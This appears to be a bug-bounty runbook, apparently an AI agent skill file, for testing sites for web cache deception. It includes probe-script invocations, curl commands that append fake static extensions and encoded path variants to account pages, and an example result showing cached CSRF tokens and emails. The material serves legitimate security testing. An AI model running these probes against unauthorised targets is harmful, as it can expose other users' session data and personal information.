# Web Cache Deception Runbook

## Purpose
Detect web cache deception where sensitive dynamic pages get cached as static files. Attackers append static file extensions (`.css`, `.js`, `.json`) to sensitive paths, causing CDNs/caches to store authenticated PII/CSRF tokens/session data that can be retrieved by anyone.

## Prerequisites
- Target uses a CDN (Cloudflare, Fastly, CloudFront, Akamai) or reverse proxy cache
- Python 3.9+ with `requests` library
- Authenticated session cookie (if testing authenticated pages)

## Variables
| Variable | Description |
|----------|-------------|
| `TARGET` | Target base URL |
| `OUTDIR` | Output directory |
| `SESSION_COOKIE` | Session cookie for authenticated testing |

## Commands

### 1. Full Cache Deception Probe
```bash
python3 .claude/skills/http-protocol/scripts/cache_deception_probe.py \
  --context .bb/context.json \
  --target https://TARGET \
  --sensitive-paths /account,/profile,/admin,/api/user,/settings,/billing,/dashboard \
  --output $OUTDIR/http-protocol/cache/deception_findings.jsonl
```

### 2. Authenticated Deception Test
```bash
python3 .claude/skills/http-protocol/scripts/cache_deception_probe.py \
  --context .bb/context.json \
  --target https://TARGET \
  --cookie "session=SESSION_COOKIE" \
  --output $OUTDIR/http-protocol/cache/deception_findings.jsonl
```

### 3. Quick Manual Check
```bash
# Test if /account/profile.css caches the full account page
curl -s "https://TARGET/account/profile/nonexistent.css" -H "Cookie: session=SESSION" -D $OUTDIR/http-protocol/cache/headers1.txt
sleep 2
curl -s "https://TARGET/account/profile/nonexistent.css" -H "Cookie: session=SESSION" -D $OUTDIR/http-protocol/cache/headers2.txt
grep -iE "age:|x-cache:|cf-cache-status:" $OUTDIR/http-protocol/cache/headers2.txt
```

### 4. Encoding Variant Check
```bash
curl -s "https://TARGET/account%2Fnonexistent.css" -D /dev/stdout -o /dev/null | grep -i cache
curl -s "https://TARGET/account;.css" -D /dev/stdout -o /dev/null | grep -i cache
```

## Expected Output

### Successful cache deception:
```json
{
  "deception_path": "/account/nonexistent.css",
  "cache_hit": true,
  "cache_indicators": ["Age: 45", "CF-Cache-Status: HIT"],
  "sensitive_data": [
    {"pattern": "csrf_token", "matches": 1, "sample": "csrf_token=abc123..."},
    {"pattern": "email", "matches": 3}
  ],
  "success": true
}
```

### Cache indicators to look for:
- `Age:` header present (cache age in seconds)
- `X-Cache: HIT`
- `CF-Cache-Status: HIT`
- `X-Varnish:` with hits counter
- `Via:` proxy header

## Triage Guide

| Result | Action |
|--------|--------|
| `cache_hit: true` + `sensitive_data: [items]` | Critical — PII cached as static file, report immediately |
| `cache_hit: true` + no sensitive data | Medium — caching dynamic paths, check manually |
| `cache_hit: false` for all paths | CDN not caching dynamic paths — safe |
| Second request significantly faster but no cache headers | CDN may be using opaque cache — check body content |
| Path returns 404 consistently | Application doesn't route dynamic content to static paths |

## Severity: Critical if PII cached (CVSS 8.5+)
Cache deception exposes authenticated user data to anyone who accesses the cached URL. Persists until cache expires or is purged.